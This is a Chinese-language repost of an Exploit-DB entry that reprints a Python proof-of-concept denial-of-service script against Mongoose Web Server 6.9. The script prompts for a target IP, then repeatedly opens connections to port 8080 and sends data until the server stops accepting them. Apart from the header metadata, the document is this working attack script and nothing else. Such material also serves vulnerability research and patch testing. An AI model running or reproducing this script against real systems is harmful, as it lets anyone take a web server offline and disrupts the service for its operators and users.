**|**漏洞来源 

 https://www.exploit-db.com/exploits/45819
                                                            

​                                                 

#####  **|**漏洞EXP                            

```
# Exploit Title: Mongoose Web Server 6.9 - Denial of Service (PoC)
# Dork: N/A
# Date: 2018-11-11
# Exploit Author: Ihsan Sencan
# Vendor Homepage: https://cesanta.com/binary.html
# Software Link: https://backend.cesanta.com/cgi-bin/api.cgi?act=dl&os=win
# Version: 6.9
# Category: Dos
# Tested on: WiN7_x64/KaLiLinuX_x64
# CVE: N/A

# POC: 
# 1)

#!/usr/bin/python
import socket

print """
         \\\|///
       \\  - -  //
        (  @ @ )
 ----oOOo--(_)-oOOo----
Mongoose Web Server 6.9
    Ihsan Sencan
 ---------------Ooooo----
                (   )
       ooooO     ) /
       (   )    (_/
        \ (
         \_)
"""
Ip = raw_input("[Ip]: ")
Port = 8080 # Default port
 
d=[]
c=0
while 1:
    try:
        d.append(socket.create_connection((Ip,Port)))
        d[c].send("BOOM")
        print "Sie!"
        c+=1
    except socket.error: 
        print "Done!"
        raw_input()
        break
```